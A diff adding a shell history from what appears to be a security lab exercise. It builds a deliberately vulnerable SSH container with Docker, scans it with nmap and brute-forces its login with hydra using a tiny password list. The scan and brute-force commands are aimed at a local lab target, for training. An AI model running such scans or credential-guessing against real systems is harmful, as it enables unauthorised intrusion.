@@ -1,0 +1,33 @@
+   55  ls
+   56  mkdir lab09
+   57  ls lab09
+   58  cd lab09
+   59  cd ..
+   60  mkdir lab10
+   61  cd lab09
+   62  sudo apt update
+   63  cd ..
+   64  sudo apt install docker-cli
+   65  sudo apt install docker.io
+   66  wget https://raw.githubusercontent.com/rpritr/KV-Vaje/refs/heads/main/lab09/dvws/Dockerfile
+   67  ifconfig
+   68  docker
+   69  ls lab09
+   70  cd lab09
+   71  wget https://raw.githubusercontent.com/rpritr/KV-Vaje/refs/heads/main/lab09/dvws/Dockerfile
+   72  ifconfig
+   73  sudo docker run -d -p 2222:22 --name dvws-ssh dvws
+   74  docker build -t dvws .
+   75  sudo docker build -t dvws .
+   76  sudo docker run -d -p 2222:22 --name dvws-ssh dvws
+   77  pa -a
+   78  ps -a
+   79  ifconfig
+   80  ps -a
+   81  sudo docker inspect dvws-ssh | grep IPAddress
+   82  nmap -sS -sV -O -p- 172.17.0.2
+   83  echo -e "password\n123456\ntest123\nadmin" > passwords.txt
+   84  ssh testuser@172.17.0.2 -p 22
+   85  nmap -sS -sV -O -p- 172.17.0.2 | grep open
+   86  hydra -l testuser -P passwords.txt -s 22 172.17.0.2 ssh
+   87  history
